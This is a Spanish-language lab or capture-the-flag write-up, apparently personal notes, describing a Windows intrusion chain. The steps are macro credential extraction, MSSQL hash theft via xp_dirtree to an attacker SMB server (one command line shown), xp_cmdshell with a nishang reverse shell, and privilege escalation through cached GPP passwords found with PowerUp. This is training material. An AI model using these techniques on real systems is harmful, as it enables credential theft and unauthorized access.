---------------
- Tags: #nishang #macro #xp-dirtree #mssql #gpp-files #NTLVMv2 #power-up
---------------
## Tecnicas utilizadas

- Macro Inspection (Olevba2)  
- MSSQL Hash Stealing [Net-NTLMv2] (xp_dirtree)  
- Abusing MSSQL (xp_cmdshell)  
- Cached GPP Files (Privilege Escalation)

---------------------
## Procedimiento

![[Pasted image 20230610194024.png]]

Empezamos escaneando el smb con **CrackMapExec** para ver ante que nos estamos enfrentando. Con **smbclient** podemos listar los recursos compartidos a nivel de red en el servidor. Con **smbmap** listamos los recursos a los que tenemos acceso.
Listando el contenido en el interior de la carpeta, podemos observar que existe un archivo *.xlsm*. Viendo su contenido, encontramos que no contiene nada, pero nos da un aviso de que conrenido una macro. Podemos inspeccionar el archivo con **olevba** para ver las macros. En la macro encontramos unas credenciales para conectarnos a *mssql*. 
Nos conectamos a la base de datos con **mssqlclient.py** que viene con *impacket*, tenemos que utilizar la bandera 
*--windows-auth* ya que a nivel de dominio el usuario no es valido, si no en la propia maquina.
Verificamos si esta habilitado el *xp_cmd* para ejecutar comandos de manera remota y no nos dice nada.

Podemos intentar ejecutar un servidor con *smb-server* para que se antentifiquen contra nosotros. Tenemos que utilizar *xp_dirtree*. La sintaxis seria la siguiente

	SQL> xp_dirtree "\\ip\\folder\"

Con el hash dumpeado, podemos intentar crackearla de manera offline con *john*. Con las credenciales creakeadas intentamos autenticanos denuevo en *mssql*. Con este nuevo usuario, se nos permite la ejecucion remota de comandos con *xp_cmdshell*. Podemos entablarnos una reverse shell con el repositorio de *nishang*.
Una ves dentro podemos hacer uso del repositorio de *PowerSploit/Privesc*  para encontrar formas potenciales de escalar privilegios Descargamos el archivo *PowerUp.ps1*, con el editor de texto lo abrimos y al final del script colocamos *invoke-AllChecks* una vez hecho esto, descargamos e interpretamos el script. El script nos muestra una contraseña en texto claro que se encontraba en unos archivos de cache, esta credencial es para el usuario Administrador.
Si intetamos conectarnos con *smb* con las credenciales vemos que nos dice **Pwned!** esto quiere decir que podemos ejecutar *psexec* para conectarnos a la maquina remotamente. O, tambien podemos conectanos con evil-winrm.